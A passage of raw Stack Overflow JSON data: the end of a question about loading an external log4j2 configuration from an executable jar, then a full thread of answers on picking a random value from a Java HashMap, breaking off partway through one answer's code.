File(args[0]);\r\n    LoggerContext context = Configurator.initialize(&quot;MyApp&quot;, null, file.toURI());\r\n\r\nor just \r\n\r\n    loggerContext context = Configurator.iniitalize(&quot;MyApp&quot;, null, args[0]);","title":"External log4j configuration file not loaded from executable jar","body":"<p>I would suggest you try</p>\n<pre><code>File file = new File(args[0]);\nLoggerContext context = Configurator.initialize(&quot;MyApp&quot;, null, file.toURI());\n</code></pre>\n<p>or just</p>\n<pre><code>loggerContext context = Configurator.iniitalize(&quot;MyApp&quot;, null, args[0]);\n</code></pre>\n"},{"tags":[],"owner":{"account_id":23656404,"reputation":1,"user_id":17684627,"display_name":"Dave Amato"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1639580911,"creation_date":1639580911,"answer_id":70365970,"question_id":66522340,"body_markdown":"Are you loading a properties file or XML file. I had issues with properties file, but the XML one worked fine","title":"External log4j configuration file not loaded from executable jar","body":"<p>Are you loading a properties file or XML file. I had issues with properties file, but the XML one worked fine</p>\n"}],"owner":{"account_id":12905304,"reputation":160,"user_id":9332788,"display_name":"Todde"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":179,"favorite_count":0,"down_vote_count":0,"up_vote_count":1,"answer_count":2,"score":1,"last_activity_date":1639580911,"creation_date":1615157712,"question_id":66522340,"body_markdown":"I need to import my log4j2 configuration file at runtime once the user gives a parameter pointing to the path where the configuration file is located (I cannot use the -Dlog4j.configurationFile parameter).\r\n\r\nAll works fine when the code is executed inside Eclipse IDE, the configuration is correctly loaded from the external file, passed as parameter by the user.\r\nOnce i build the jar file, the same piece of code does not work and configuration of the external file is not correctly loaded for my logs.\r\n\r\nThe path to the log file is given as absolute path.\r\n\r\nLog4j2 version: 2.11\r\n\r\nHere is the code that i&#39;m currently using:\r\n\r\n    \t\r\n\r\n     public static void main(String[] args) {\r\n                \t\tLoggerContext context = (LoggerContext) LogManager.getContext(false);\r\n                \t\tFile file = new File(args[0]);\r\n                \t\tcontext.setConfigLocation(file.toURI());\r\n                        .....................\r\n            }\r\n\r\nargs[0] contains the absolute path to the log4j2 configuration file.\r\n\r\nAny idea of what i am doing wrong?\r\nThank you\r\n","title":"External log4j configuration file not loaded from executable jar","body":"<p>I need to import my log4j2 configuration file at runtime once the user gives a parameter pointing to the path where the configuration file is located (I cannot use the -Dlog4j.configurationFile parameter).</p>\n<p>All works fine when the code is executed inside Eclipse IDE, the configuration is correctly loaded from the external file, passed as parameter by the user.\nOnce i build the jar file, the same piece of code does not work and configuration of the external file is not correctly loaded for my logs.</p>\n<p>The path to the log file is given as absolute path.</p>\n<p>Log4j2 version: 2.11</p>\n<p>Here is the code that i'm currently using:</p>\n<pre><code> public static void main(String[] args) {\n                    LoggerContext context = (LoggerContext) LogManager.getContext(false);\n                    File file = new File(args[0]);\n                    context.setConfigLocation(file.toURI());\n                    .....................\n        }\n</code></pre>\n<p>args[0] contains the absolute path to the log4j2 configuration file.</p>\n<p>Any idea of what i am doing wrong?\nThank you</p>\n"},{"tags":["java","collections","hashmap"],"comments":[{"owner":{"account_id":18399,"reputation":38994,"user_id":42126,"accept_rate":100,"display_name":"kdgregory"},"score":1,"creation_date":1243682474,"post_id":929554,"comment_id":737395,"body_markdown":"Why do you need this? If it&#39;s anything other than testing, you&#39;re using the wrong data structure. If it&#39;s for testing, then you probably don&#39;t want random data.","body":"Why do you need this? If it&#39;s anything other than testing, you&#39;re using the wrong data structure. If it&#39;s for testing, then you probably don&#39;t want random data."},{"owner":{"account_id":20470,"reputation":21695,"user_id":48933,"accept_rate":90,"display_name":"Neil Coffey"},"score":0,"creation_date":1243688890,"post_id":929554,"comment_id":737551,"body_markdown":"See my answer below -- the appropriate way to do this depends a little on your circumstances (notably how many random elements you need per change to the map).","body":"See my answer below -- the appropriate way to do this depends a little on your circumstances (notably how many random elements you need per change to the map)."},{"owner":{"account_id":71043,"reputation":30960,"user_id":205521,"accept_rate":89,"display_name":"Thomas Ahle"},"score":1,"creation_date":1387665035,"post_id":929554,"comment_id":31047764,"body_markdown":"If you want something efficient, take a look at my answer in http://stackoverflow.com/questions/9919734/selecting-random-key-and-value-sets-from-a-map-in-java/20724193#20724193 Hashtables are in principle a great structure for accessing random elements. It&#39;s unfortunate that the Java api doesn&#39;t give us an easy way to do it.","body":"If you want something efficient, take a look at my answer in <a href=\"http://stackoverflow.com/questions/9919734/selecting-random-key-and-value-sets-from-a-map-in-java/20724193#20724193\" title=\"selecting random key and value sets from a map in java\">stackoverflow.com/questions/9919734/&hellip;</a> Hashtables are in principle a great structure for accessing random elements. It&#39;s unfortunate that the Java api doesn&#39;t give us an easy way to do it."},{"owner":{"account_id":480922,"reputation":739,"user_id":894439,"accept_rate":48,"display_name":"MTA"},"score":0,"creation_date":1423057297,"post_id":929554,"comment_id":44993555,"body_markdown":"@kdgregory hi, I know it&#39;s an old thread, but I wonder why you&#39;re saying its the wrong data structure for random access? Thanks","body":"@kdgregory hi, I know it&#39;s an old thread, but I wonder why you&#39;re saying its the wrong data structure for random access? Thanks"},{"owner":{"account_id":18399,"reputation":38994,"user_id":42126,"accept_rate":100,"display_name":"kdgregory"},"score":2,"creation_date":1423164872,"post_id":929554,"comment_id":45048773,"body_markdown":"@RegUser - HashMaps are designed to be accessed by key rather than value. There are uses for bidirectional mappings, but you should choose a class designed for that purpose and not try force HashMap to do something that it wasn&#39;t designed to do.","body":"@RegUser - HashMaps are designed to be accessed by key rather than value. There are uses for bidirectional mappings, but you should choose a class designed for that purpose and not try force HashMap to do something that it wasn&#39;t designed to do."}],"answers":[{"tags":[],"owner":{"account_id":39633,"reputation":36177,"user_id":114400,"accept_rate":81,"display_name":"Alistair Evans"},"down_vote_count":1,"up_vote_count":0,"is_accepted":false,"score":-1,"last_activity_date":1243681841,"creation_date":1243681841,"answer_id":929559,"question_id":929554,"body_markdown":"It depends on what your key is - the nature of a hashmap doesn&#39;t allow for this to happen easily.\r\n\r\nThe way I can think of off the top of my head is to select a random number between 1 and the size of the hashmap, and then start iterating over it, maintaining a count as you go - when count is equal to that random number you chose, that is your random element.","title":"Is there a way to get the value of a HashMap randomly in Java?","body":"<p>It depends on what your key is - the nature of a hashmap doesn't allow for this to happen easily.</p>\n\n<p>The way I can think of off the top of my head is to select a random number between 1 and the size of the hashmap, and then start iterating over it, maintaining a count as you go - when count is equal to that random number you chose, that is your random element.</p>\n"},{"tags":[],"owner":{"account_id":1231,"reputation":5094,"user_id":1633,"accept_rate":83,"display_name":"Peter Stuifzand"},"down_vote_count":0,"up_vote_count":3,"is_accepted":false,"score":3,"last_activity_date":1243682588,"creation_date":1243681884,"answer_id":929560,"question_id":929554,"body_markdown":"Generate a random number between 0 and the number of keys in your `HashMap`. Get the key at the random number. Get the value from that key.\r\n\r\n**Pseudocode**:\r\n\r\n     int n =  random(map.keys().length());\r\n     String key = map.keys().at(n);\r\n     Object value = map.at(key);\r\n\r\nIf it&#39;s hard to implement this in Java, then you could create and array from this code using the `toArray()` function in `Set`.\r\n\r\n     Object[] values = map.values().toArray(new Object[map.size()]);\r\n     Object random_value = values[random(values.length)];\r\n\r\nI&#39;m not really sure how to do the random number.","title":"Is there a way to get the value of a HashMap randomly in Java?","body":"<p>Generate a random number between 0 and the number of keys in your <code>HashMap</code>. Get the key at the random number. Get the value from that key.</p>\n\n<p><strong>Pseudocode</strong>:</p>\n\n<pre><code> int n =  random(map.keys().length());\n String key = map.keys().at(n);\n Object value = map.at(key);\n</code></pre>\n\n<p>If it's hard to implement this in Java, then you could create and array from this code using the <code>toArray()</code> function in <code>Set</code>.</p>\n\n<pre><code> Object[] values = map.values().toArray(new Object[map.size()]);\n Object random_value = values[random(values.length)];\n</code></pre>\n\n<p>I'm not really sure how to do the random number.</p>\n"},{"tags":[],"owner":{"account_id":32598,"reputation":13160,"user_id":90573,"display_name":"Tom Jefferys"},"down_vote_count":2,"up_vote_count":66,"is_accepted":true,"score":64,"last_activity_date":1558369074,"creation_date":1243682590,"answer_id":929574,"question_id":929554,"body_markdown":"This works:\r\n\r\n    Random generator = new Random();\r\n    Object[] values = myHashMap.values().toArray();\r\n    Object randomValue = values[generator.nextInt(values.length)];\r\n\r\nIf you want the random value to be a type other than an `Object` simply add a cast to the last line.  So if `myHashMap` was declared as:\r\n\r\n    Map&lt;Integer,String&gt; myHashMap = new HashMap&lt;Integer,String&gt;();\r\n\r\nThe last line can be:\r\n\r\n    String randomValue = (String) values[generator.nextInt(value.length)];\r\n\r\n----------\r\n\r\nThe below **doesn&#39;t work**, `Set.toArray()` always returns an array of `Object`s, which can&#39;t be coerced into an array of `Map.Entry`.\r\n\r\n    Random generator = new Random();\r\n    Map.Entry[] entries = myHashMap.entrySet().toArray();\r\n    randomValue = entries[generator.nextInt(entries.length)].getValue();\r\n\r\n","title":"Is there a way to get the value of a HashMap randomly in Java?","body":"<p>This works:</p>\n\n<pre><code>Random generator = new Random();\nObject[] values = myHashMap.values().toArray();\nObject randomValue = values[generator.nextInt(values.length)];\n</code></pre>\n\n<p>If you want the random value to be a type other than an <code>Object</code> simply add a cast to the last line.  So if <code>myHashMap</code> was declared as:</p>\n\n<pre><code>Map&lt;Integer,String&gt; myHashMap = new HashMap&lt;Integer,String&gt;();\n</code></pre>\n\n<p>The last line can be:</p>\n\n<pre><code>String randomValue = (String) values[generator.nextInt(value.length)];\n</code></pre>\n\n<hr>\n\n<p>The below <strong>doesn't work</strong>, <code>Set.toArray()</code> always returns an array of <code>Object</code>s, which can't be coerced into an array of <code>Map.Entry</code>.</p>\n\n<pre><code>Random generator = new Random();\nMap.Entry[] entries = myHashMap.entrySet().toArray();\nrandomValue = entries[generator.nextInt(entries.length)].getValue();\n</code></pre>\n"},{"tags":[],"owner":{"account_id":9320,"reputation":159784,"user_id":17172,"display_name":"coobird"},"down_vote_count":0,"up_vote_count":36,"is_accepted":false,"score":36,"last_activity_date":1243688995,"creation_date":1243684362,"answer_id":929610,"question_id":929554,"body_markdown":"Since the requirements only asks for a random value from the `HashMap`, here&#39;s the approach:\r\n\r\n1. The [`HashMap`][1] has a [`values`][2] method which returns a [`Collection`][3] of the values in the map.\r\n2. The `Collection` is used to create a [`List`][4].\r\n3. The [`size`][5] method is used to find the size of the `List`, which is used by the [`Random.nextInt`][7] method to get a random index of the `List`.\r\n4. Finally, the value is retrieved from the `List` [`get`][6] method with the random index.\r\n\r\nImplementation:\r\n\r\n    HashMap&lt;String, Integer&gt; map = new HashMap&lt;String, Integer&gt;();\r\n    map.put(&quot;Hello&quot;, 10);\r\n    map.put(&quot;Answer&quot;, 42);\r\n    \r\n    List&lt;Integer&gt; valuesList = new ArrayList&lt;Integer&gt;(map.values());\r\n    int randomIndex = new Random().nextInt(valuesList.size());\r\n    Integer randomValue = valuesList.get(randomIndex);\r\n\r\nThe nice part about this approach is that all the methods are [generic][8] -- there is no need for typecasting.\r\n\r\n\r\n  [1]: http://java.sun.com/javase/6/docs/api/java/util/HashMap.html\r\n  [2]: http://java.sun.com/javase/6/docs/api/java/util/HashMap.html#values()\r\n  [3]: http://java.sun.com/javase/6/docs/api/java/util/Collection.html\r\n  [4]: http://java.sun.com/javase/6/docs/api/java/util/List.html\r\n  [5]: http://java.sun.com/javase/6/docs/api/java/util/List.html#size()\r\n  [6]: http://java.sun.com/javase/6/docs/api/java/util/List.html#get(int)\r\n  [7]: http://java.sun.com/javase/6/docs/api/java/util/Random.html#nextInt(int)\r\n  [8]: http://java.sun.com/j2se/1.5.0/docs/guide/language/generics.html","title":"Is there a way to get the value of a HashMap randomly in Java?","body":"<p>Since the requirements only asks for a random value from the <code>HashMap</code>, here's the approach:</p>\n\n<ol>\n<li>The <a href=\"http://java.sun.com/javase/6/docs/api/java/util/HashMap.html\" rel=\"noreferrer\"><code>HashMap</code></a> has a <a href=\"http://java.sun.com/javase/6/docs/api/java/util/HashMap.html#values()\" rel=\"noreferrer\"><code>values</code></a> method which returns a <a href=\"http://java.sun.com/javase/6/docs/api/java/util/Collection.html\" rel=\"noreferrer\"><code>Collection</code></a> of the values in the map.</li>\n<li>The <code>Collection</code> is used to create a <a href=\"http://java.sun.com/javase/6/docs/api/java/util/List.html\" rel=\"noreferrer\"><code>List</code></a>.</li>\n<li>The <a href=\"http://java.sun.com/javase/6/docs/api/java/util/List.html#size()\" rel=\"noreferrer\"><code>size</code></a> method is used to find the size of the <code>List</code>, which is used by the <a href=\"http://java.sun.com/javase/6/docs/api/java/util/Random.html#nextInt(int)\" rel=\"noreferrer\"><code>Random.nextInt</code></a> method to get a random index of the <code>List</code>.</li>\n<li>Finally, the value is retrieved from the <code>List</code> <a href=\"http://java.sun.com/javase/6/docs/api/java/util/List.html#get(int)\" rel=\"noreferrer\"><code>get</code></a> method with the random index.</li>\n</ol>\n\n<p>Implementation:</p>\n\n<pre><code>HashMap&lt;String, Integer&gt; map = new HashMap&lt;String, Integer&gt;();\nmap.put(\"Hello\", 10);\nmap.put(\"Answer\", 42);\n\nList&lt;Integer&gt; valuesList = new ArrayList&lt;Integer&gt;(map.values());\nint randomIndex = new Random().nextInt(valuesList.size());\nInteger randomValue = valuesList.get(randomIndex);\n</code></pre>\n\n<p>The nice part about this approach is that all the methods are <a href=\"http://java.sun.com/j2se/1.5.0/docs/guide/language/generics.html\" rel=\"noreferrer\">generic</a> -- there is no need for typecasting.</p>\n"},{"tags":[],"owner":{"account_id":39737,"reputation":975,"user_id":114759,"display_name":"MH114"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1243686602,"creation_date":1243685056,"answer_id":929629,"question_id":929554,"body_markdown":"Here is an example how to use the arrays approach described by Peter Stuifzand, also through the `values()`-method:\r\n\r\n    // Populate the map\r\n    // ...\r\n\r\n    Object[] keys = map.keySet().toArray();\r\n    Object[] values = map.values().toArray();\r\n\r\n    Random rand = new Random();\r\n\r\n    // Get random key (and value, as an example)\r\n    String randKey = keys[ rand.nextInt(keys.length) ];\r\n    String randValue = values[ rand.nextInt(values.length) ];\r\n\r\n    // Use the random key\r\n    System.out.println( map.get(randKey) );","title":"Is there a way to get the value of a HashMap randomly in Java?","body":"<p>Here is an example how to use the arrays approach described by Peter Stuifzand, also through the <code>values()</code>-method:</p>\n\n<pre><code>// Populate the map\n// ...\n\nObject[] keys = map.keySet().toArray();\nObject[] values = map.values().toArray();\n\nRandom rand = new Random();\n\n// Get random key (and value, as an example)\nString randKey = keys[ rand.nextInt(keys.length) ];\nString randValue = values[ rand.nextInt(values.length) ];\n\n// Use the random key\nSystem.out.println( map.get(randKey) );\n</code></pre>\n"},{"tags":[],"owner":{"account_id":35714,"reputation":10973,"user_id":101251,"accept_rate":59,"display_name":"kctang"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1243685666,"creation_date":1243685666,"answer_id":929647,"question_id":929554,"body_markdown":"i really don&#39;t know why you want to do this... but if it helps, i&#39;ve created a RandomMap that automatically randomizes the values when you call values(), then the following runnable demo application might do the job... \r\n\r\n\r\n\r\n\r\n      package random;\r\n\r\n      import java.util.ArrayList;\r\n      import java.util.Collection;\r\n      import java.util.Collections;\r\n      import java.util.HashMap;\r\n      import java.util.Iterator;\r\n      import java.util.List;\r\n      import java.util.Map;\r\n      import java.util.TreeMap;\r\n\r\n      public class Main {\r\n          public static void main(String[] args) {\r\n              Map hashMap = makeHashMap();\r\n              // you can make any Map random by making them a RandomMap\r\n              // better if you can just create the Map as a RandomMap instead of HashMap\r\n              Map randomMap = new RandomMap(hashMap);\r\n\r\n              // just call values() and iterate through them, they will be random\r\n              Iterator iter = randomMap.values().iterator();\r\n\r\n              while (iter.hasNext()) {\r\n                  String value = (String) iter.next();\r\n                  System.out.println(value);\r\n              }\r\n          }\r\n\r\n          private static Map makeHashMap() {\r\n              Map retVal;\r\n\r\n              // HashMap is not ordered, and not exactly random (read the javadocs)\r\n              retVal = new HashMap();\r\n\r\n              // TreeMap sorts your map based on Comparable of keys\r\n              retVal = new TreeMap();\r\n\r\n              // RandomMap - a map that returns stuff randomly\r\n              // use this, don&#39;t have to create RandomMap after function returns\r\n              // retVal = new HashMap();\r\n\r\n              for (int i = 0; i &lt; 20; i++) {\r\n                  retVal.put(&quot;key&quot; + i, &quot;value&quot; + i);\r\n              }\r\n\r\n              return retVal;\r\n          }\r\n      }\r\n\r\n      /**\r\n       * An implementation of Map that shuffles the Collection returned by values().\r\n       * Similar approach can be applied to its entrySet() and keySet() methods.\r\n       */\r\n      class RandomMap extends HashMap {\r\n          public RandomMap() {\r\n              super();\r\n          }\r\n\r\n          public RandomMap(Map map) {\r\n              super(map);\r\n          }\r\n\r\n          /**\r\n           * Randomize the values on every call to values()\r\n           *\r\n           * @return randomized Collection\r\n           */\r\n          @Override\r\n          public Collection values() {\r\n              List randomList = new ArrayList(super.values());\r\n              Collections.shuffle(randomList);\r\n\r\n              return randomList;\r\n          }\r\n\r\n      }","title":"Is there a way to get the value of a HashMap randomly in Java?","body":"<p>i really don't know why you want to do this... but if it helps, i've created a RandomMap that automatically randomizes the values when you call values(), then the following runnable demo application might do the job... </p>\n\n<pre><code>  package random;\n\n  import java.util.ArrayList;\n  import java.util.Collection;\n  import java.util.Collections;\n  import java.util.HashMap;\n  import java.util.Iterator;\n  import java.util.List;\n  import java.util.Map;\n  import java.util.TreeMap;\n\n  public class Main {\n      public static void main(String[] args) {\n          Map hashMap = makeHashMap();\n          // you can make any Map random by making them a RandomMap\n          // better if you can just create the Map as a RandomMap instead of HashMap\n          Map randomMap = new RandomMap(hashMap);\n\n          // just call values() and iterate through them, they will be random\n          Iterator iter = randomMap.values().iterator();\n\n          while (iter.hasNext()) {\n              String value = (String) iter.next();\n              System.out.println(value);\n          }\n      }\n\n      private static Map makeHashMap() {\n          Map retVal;\n\n          // HashMap is not ordered, and not exactly random (read the javadocs)\n          retVal = new HashMap();\n\n          // TreeMap sorts your map based on Comparable of keys\n          retVal = new TreeMap();\n\n          // RandomMap - a map that returns stuff randomly\n          // use this, don't have to create RandomMap after function returns\n          // retVal = new HashMap();\n\n          for (int i = 0; i &lt; 20; i++) {\n              retVal.put(\"key\" + i, \"value\" + i);\n          }\n\n          return retVal;\n      }\n  }\n\n  /**\n   * An implementation of Map that shuffles the Collection returned by values().\n   * Similar approach can be applied to its entrySet() and keySet() methods.\n   */\n  class RandomMap extends HashMap {\n      public RandomMap() {\n          super();\n      }\n\n      public RandomMap(Map map) {\n          super(map);\n      }\n\n      /**\n       * Randomize the values on every call to values()\n       *\n       * @return randomized Collection\n       */\n      @Override\n      public Collection values() {\n          List randomList = new ArrayList(super.values());\n          Collections.shuffle(randomList);\n\n          return randomList;\n      }\n\n  }\n</code></pre>\n"},{"tags":[],"owner":{"account_id":14406,"reputation":4490,"user_id":29620,"accept_rate":92,"display_name":"banjollity"},"down_vote_count":0,"up_vote_count":11,"is_accepted":false,"score":11,"last_activity_date":1243686542,"creation_date":1243686542,"answer_id":929664,"question_id":929554,"body_markdown":"Should you need to draw futher values from the map without repeating any elements you can put the map into a List and then shuffle it.\r\n\r\n    List&lt;Object&gt; valuesList = new ArrayList&lt;Object&gt;(map.values());\r\n    Collections.shuffle( valuesList );\r\n    \r\n    for ( Object obj : valuesList ) {\r\n        System.out.println( obj );\r\n    }\r\n","title":"Is there a way to get the value of a HashMap randomly in Java?","body":"<p>Should you need to draw futher values from the map without repeating any elements you can put the map into a List and then shuffle it.</p>\n\n<pre><code>List&lt;Object&gt; valuesList = new ArrayList&lt;Object&gt;(map.values());\nCollections.shuffle( valuesList );\n\nfor ( Object obj : valuesList ) {\n    System.out.println( obj );\n}\n</code></pre>\n"},{"tags":[],"owner":{"account_id":20470,"reputation":21695,"user_id":48933,"accept_rate":90,"display_name":"Neil Coffey"},"down_vote_count":0,"up_vote_count":1,"is_accepted":false,"score":1,"last_activity_date":1243702989,"creation_date":1243688853,"answer_id":929706,"question_id":929554,"body_markdown":"A good answer depends slightly on the circumstances, in particular how often you need to get a random key for a given map (N.B. the technique is essentially the same whether you take key or value).\r\n\r\n - If you need **various random keys**\r\n   from a given map, **without the map\r\n   changing** in between getting the\r\n   random keys, then use the **[random\r\n   sampling method][1]** as you iterate\r\n   through the key set. Effectively what\r\n   you do is iterate over the set\r\n   returned by keySet(), and on each\r\n   item calculate the probability of\r\n   wanting to take that key, given how\r\n   many you will need overall and the\r\n   number you&#39;ve taken so far. Then\r\n   generate a random number and see if\r\n   that number is lower than the\r\n   probability. (N.B. **This method will always work**, even if you only need 1 key; it&#39;s just not necessarily the most efficient way in that case.)\r\n - The keys in a HashMap are effectively\r\n   in pseudo-random order already. In an\r\n   extreme case where you will **only\r\n   ever need one random key** for a\r\n   given possible map, you could even just\r\n   pull out the **first element of the\r\n   keySet()**.\r\n - In **other cases** (where you either\r\n   need multiple possible random keys\r\n   for a given possible map, or the map\r\n   will change between you taking random\r\n   keys), you essentially have to\r\n   **create or maintain an array/list** of the keys from which you select a\r\n   random key.\r\n\r\n  [1]: http://www.javamex.com/tutorials/random_numbers/random_sample.shtml","title":"Is there a way to get the value of a HashMap randomly in Java?","body":"<p>A good answer depends slightly on the circumstances, in particular how often you need to get a random key for a given map (N.B. the technique is essentially the same whether you take key or value).</p>\n\n<ul>\n<li>If you need <strong>various random keys</strong>\nfrom a given map, <strong>without the map\nchanging</strong> in between getting the\nrandom keys, then use the <strong><a href=\"http://www.javamex.com/tutorials/random_numbers/random_sample.shtml\" rel=\"nofollow noreferrer\">random\nsampling method</a></strong> as you iterate\nthrough the key set. Effectively what\nyou do is iterate over the set\nreturned by keySet(), and on each\nitem calculate the probability of\nwanting to take that key, given how\nmany you will need overall and the\nnumber you've taken so far. Then\ngenerate a random number and see if\nthat number is lower than the\nprobability. (N.B. <strong>This method will always work</strong>, even if you only need 1 key; it's just not necessarily the most efficient way in that case.)</li>\n<li>The keys in a HashMap are effectively\nin pseudo-random order already. In an\nextreme case where you will <strong>only\never need one random key</strong> for a\ngiven possible map, you could even just\npull out the <strong>first element of the\nkeySet()</strong>.</li>\n<li>In <strong>other cases</strong> (where you either\nneed multiple possible random keys\nfor a given possible map, or the map\nwill change between you taking random\nkeys), you essentially have to\n<strong>create or maintain an array/list</strong> of the keys from which you select a\nrandom key.</li>\n</ul>\n"},{"tags":[],"owner":{"account_id":202280,"reputation":1141,"user_id":1213822,"accept_rate":50,"display_name":"Kalisky"},"down_vote_count":3,"up_vote_count":3,"is_accepted":false,"score":0,"last_activity_date":1336392440,"creation_date":1336392440,"answer_id":10481788,"question_id":929554,"body_markdown":"Usually you do not really want a **random** value but rather just **any** value, and then it&#39;s nice doing this:\r\n\r\n    Object selectedObj = null;\r\n    for (Object obj : map.values()) {\r\n        selectedObj = obj;\r\n        break;\r\n    }\r\n\r\n","title":"Is there a way to get the value of a HashMap randomly in Java?","body":"<p>Usually you do not really want a <strong>random</strong> value but rather just <strong>any</strong> value, and then it's nice doing this:</p>\n\n<pre><code>Object selectedObj = null;\nfor (Object obj : map.values()) {\n    selectedObj = obj;\n    break;\n}\n</code></pre>\n"},{"tags":[],"owner":{"account_id":165295,"reputation":2981,"user_id":388614,"accept_rate":50,"display_name":"Quonux"},"down_vote_count":0,"up_vote_count":2,"is_accepted":false,"score":2,"last_activity_date":1432927807,"creation_date":1432927807,"answer_id":30537651,"question_id":929554,"body_markdown":"Converting it to an array and then getting the value is too slow when its in the hot path.\r\n\r\nso get the set (either the key or keyvalue set) and do something like:\r\n\r\n        public class SetUtility {\r\n            public static&lt;Type&gt; Type getRandomElementFromSet(final Set&lt;Type&gt; set, Random random) {\r\n            final int index = random.nextInt(set.size());\r\n\r\n            Iterator&lt;Type&gt; iterator = set.iterator();\r\n\r\n            for( int i = 0; i &lt; index-1; i++ ) {\r\n                iterator.next();\r\n            }\r\n\r\n            return iterator.next();\r\n        }","title":"Is there a way to get the value of a HashMap randomly in Java?","body":"<p>Converting it to an array and then getting the value is too slow when its in the hot path.</p>\n\n<p>so get the set (either the key or keyvalue set) and do something like:</p>\n\n<pre><code>    public class SetUtility {\n        public static&lt;Type&gt; Type getRandomElementFromSet(final Set&lt;Type&gt; set, Random random) {\n        final int index = random.nextInt(set.size());\n\n        Iterator&lt;Type&gt; iterator = set.iterator();\n\n        for( int i = 0; i &lt; index-1; i++ ) {\n            iterator.next();\n        }\n\n        return iterator.next();\n    }\n</code></pre>\n"},{"tags":[],"owner":{"account_id":1960454,"reputation":44539,"user_id":1762224,"accept_rate":61,"display_name":"Mr. Polywhirl"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1456255196,"creation_date":1456252901,"answer_id":35585591,"question_id":929554,"body_markdown":"I wrote a utility to retrieve a random entry, key, or value from a map, entry set, or iterator.\r\n\r\nSince you cannot and should not be able to figure out the size of an iterator ([Guava can do this][1]) you will have to overload the `randEntry()` method to accept a size which should be the length of the entries.\r\n\r\n    package util;\r\n\r\n    import java.util.HashMap;\r\n    import java.util.Iterator;\r\n    import java.util.Map;\r\n    import java.util.Map.Entry;\r\n    import java.util.Set;\r\n    \r\n    public class MapUtils {\r\n    \tpublic static void main(String[] args) {\r\n    \t\tMap&lt;String, Integer&gt; map = new HashMap&lt;String, Integer&gt;() {\r\n    \t\t\tprivate static final long serialVersionUID = 1L;\r\n    \t\t\t{\r\n    \t\t\t\tput(&quot;Foo&quot;, 1);\r\n    \t\t\t\tput(&quot;Bar&quot;, 2);\r\n    \t\t\t\tput(&quot;Baz&quot;, 3);\r\n    \t\t\t}\r\n    \t\t};\r\n    \r\n    \t\tSystem.out.println(randEntryValue(map));\r\n    \t}\r\n    \t\r\n    \tstatic &lt;K, V&gt; Entry&lt;K, V&gt; randEntry(Iterator&lt;Entry&lt;K, V&gt;&gt; it, int count) {\r\n    \t\tint index = (int) (Math.random() * count);\r\n    \r\n    \t\twhile (index &gt; 0 &amp;&amp; it.hasNext()) {\r\n    \t\t\tit.next();\r\n    \t\t\tindex--;\r\n    \t\t}\r\n    \r\n    \t\treturn it.next();\r\n    \t}\r\n    \t\r\n    \tstatic &lt;K, V&gt; Entry&lt;K, V&gt; randEntry(Set&lt;Entry&lt;K, V&gt;&gt; entries) {\r\n    \t\treturn randEntry(entries.iterator(), entries.size());\r\n    \t}\r\n    \t\r\n    \tstatic &lt;K, V&gt; Entry&lt;K, V&gt; randEntry(Map&lt;K, V&gt; map) {\r\n    \t\treturn randEntry(map.entrySet());\r\n    \t}\r\n    \r\n    \tstatic &lt;K, V&gt; K randEntryKey(Map&lt;K, V&gt; map) {\r\n    \t\treturn randEntry(map).getKey();\r\n    \t}\r\n    \r\n    \tstatic &lt;K, V&gt; V randEntryValue(Map&lt;K, V&gt; map) {\r\n    \t\treturn randEntry(map).getValue();\r\n    \t}\r\n    }\r\n\r\n  [1]: http://docs.guava-libraries.googlecode.com/git/javadoc/com/google/common/collect/Iterators.html#size(java.util.Iterator)\r\n","title":"Is there a way to get the value of a HashMap randomly in Java?","body":"<p>I wrote a utility to retrieve a random entry, key, or value from a map, entry set, or iterator.</p>\n\n<p>Since you cannot and should not be able to figure out the size of an iterator (<a href=\"http://docs.guava-libraries.googlecode.com/git/javadoc/com/google/common/collect/Iterators.html#size(java.util.Iterator)\" rel=\"nofollow\">Guava can do this</a>) you will have to overload the <code>randEntry()</code> method to accept a size which should be the length of the entries.</p>\n\n<pre><code>package util;\n\nimport java.util.HashMap;\nimport java.util.Iterator;\nimport java.util.Map;\nimport java.util.Map.Entry;\nimport java.util.Set;\n\npublic class MapUtils {\n    public static void main(String[] args) {\n        Map&lt;String, Integer&gt; map = new HashMap&lt;String, Integer&gt;() {\n            private static final long serialVersionUID = 1L;\n            {\n                put(\"Foo\", 1);\n                put(\"Bar\", 2);\n                put(\"Baz\", 3);\n            }\n        };\n\n        System.out.println(randEntryValue(map));\n    }\n\n    static &lt;K, V&gt; Entry&lt;K, V&gt; randEntry(Iterator&lt;Entry&lt;K, V&gt;&gt; it, int count) {\n        int index = (int) (Math.random() * count);\n\n        while (index &gt; 0 &amp;&amp; it.hasNext()) {\n            it.next();\n            index--;\n        }\n\n        return it.next();\n    }\n\n    static &lt;K, V&gt; Entry&lt;K, V&gt; randEntry(Set&lt;Entry&lt;K, V&gt;&gt; entries) {\n        return randEntry(entries.iterator(), entries.size());\n    }\n\n    static &lt;K, V&gt; Entry&lt;K, V&gt; randEntry(Map&lt;K, V&gt; map) {\n        return randEntry(map.entrySet());\n    }\n\n    static &lt;K, V&gt; K randEntryKey(Map&lt;K, V&gt; map) {\n        return randEntry(map).getKey();\n    }\n\n    static &lt;K, V&gt; V randEntryValue(Map&lt;K, V&gt; map) {\n        return randEntry(map).getValue();\n    }\n}\n</code></pre>\n"},{"tags":[],"owner":{"account_id":3063345,"reputation":992,"user_id":2595579,"accept_rate":40,"display_name":"dim"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1587539118,"creation_date":1587539118,"answer_id":61359139,"question_id":929554,"body_markdown":"If you are fine with `O(n)` time complexity you can use methods like `values()` or `values().toArray()` but if you look for a constant `O(1)` `getRandom()` operation one great alternative is to use a custom data structure. `ArrayList` and `HashMap` can be combined to attain `O(1)` time for `insert()`, `remove()` and `getRandom()`. Here is an example implementation:\r\n\r\n```\r\nclass RandomizedSet {\r\n    List&lt;Integer&gt; nums = new ArrayList&lt;&gt;();\r\n    Map&lt;Integer, Integer&gt; valToIdx = new HashMap&lt;&gt;();\r\n    Random rand = new Random();\r\n\r\n    public RandomizedSet() { }\r\n\r\n    /**\r\n     * Inserts a value to the set. Returns true if the set did not already contain\r\n     * the specified element.\r\n     */\r\n    public boolean insert(int val) {\r\n        if (!valToIdx.containsKey(val)) {\r\n            